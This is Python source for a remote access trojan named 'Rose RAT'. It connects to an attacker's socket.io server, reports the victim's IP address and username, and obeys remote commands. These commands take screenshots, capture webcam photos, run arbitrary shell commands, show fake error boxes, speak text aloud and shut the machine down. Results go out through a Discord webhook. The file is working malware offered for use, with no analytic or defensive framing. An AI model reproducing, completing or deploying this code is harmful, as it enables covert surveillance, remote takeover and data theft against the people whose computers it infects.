import socketio
from dhooks import Webhook as web
from dhooks import Embed, File

from PIL import ImageGrab
from pynput.keyboard import Key, Controller
import cv2

import random 
import string

import ctypes
import os
import subprocess
import io

from config import Config 
cc = Config()

from __webhook import _WebhookX


# getting hwid = wmic csproduct get uuid

from informations import Info
ii = Info()

sio = socketio.Client()

class CommandHandler():
    def __init__(self):
        self.webhook = _WebhookX().get_object()
        self.keyboard = Controller()
        
    def screenshot(self):
        screenshot = ImageGrab.grab()
        file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
        screenshot.save(f"temp_{file_name}.png")
        file = File(f"temp_{file_name}.png", name='Rose-Injector Screenshot.png') 
        self.webhook.send(file=file)
        os.remove(f"temp_{file_name}.png")
        
    @staticmethod
    def messagebox(message):
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)
        
    def shell(self, instruction):
        def _shell():
            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        
        try:    
            result = str(_shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
        except Exception as e:
            result = str(f"Error | Advanced log: {e}")
            
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Result", value=f'`{result}`')
        
        self.webhook.send(embed=embed)
        
    def shutdown(self):
        embed = Embed(
            description='Rose RAT',
            color=11495919,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        
        self.webhook.send(embed=embed)
        os.system("shutdown /s /t 1")
        
    def webcampic(self): #Take a picture with the webcam and send it with the webhook
        try:            
            cam = cv2.VideoCapture(0)   # 0 -> index of camera
            s, img = cam.read()
            if s:    # frame captured without any errors
                suc, buffer = cv2.imencode(".jpg", img)
                io_buf = io.BytesIO(buffer)
                file = File(io_buf,name='cam.jpg') 
                self.webhook.send(file=file)
                
        except Exception as e:
            embed = Embed(
            description='Rose RAT',
                color=16399677,
                timestamp='now'  # sets the timestamp to current time
            )

            embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
            embed.add_field(name="Advanced log:", value=f'`{e}`')
            
            self.webhook.send(embed=embed)
                
    def volumeup(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_up)
            self.keyboard.release(Key.media_volume_up)     
              
    def volumedown(self):
        for i in range(50):
            self.keyboard.press(Key.media_volume_down)
            self.keyboard.release(Key.media_volume_down)  
            
    def voice(self, text):
        import pyttsx3
        self.volumeup()
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(text)
        engine.runAndWait()
            
cmdhandler = CommandHandler()

@sio.event
def connect():
    sio.emit('rose_connect', {'data': {
        'ip': ii.get_ip(),
        'username': ii.get_username(),
        'server': cc.get_discord_rat_link(),
        'webhook': cc.get_webhook(),
        'avatar': cc.get_avatar(),
        'footer': cc.get_footer(),
    }})
    
@sio.event 
def receive_command(data):
    if data['data'] == 'screenshot':
        cmdhandler.screenshot()
        
    if data['data'].startswith('messagebox') is True:
        cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])
        
    if data['data'].startswith('shell') is True:
        cmdhandler.shell(data['data'].split('shell', 1)[1])
        
    if data['data'].startswith('voice') is True:
        cmdhandler.voice(data['data'].split('voice', 1)[1])
    
    if data['data'] == 'volumemax':
        cmdhandler.volumeup()
        
    if data['data'] == 'volumezero':
        cmdhandler.volumedown()
        
    if data['data'] == 'shutdown':
        cmdhandler.shutdown()

    if data['data'] == 'webcampic':
        cmdhandler.webcampic()


@sio.event
def disconnect():
    print("disconnect")
    
def run_rat():
    sio.connect(cc.get_discord_rat_link())
    sio.wait()
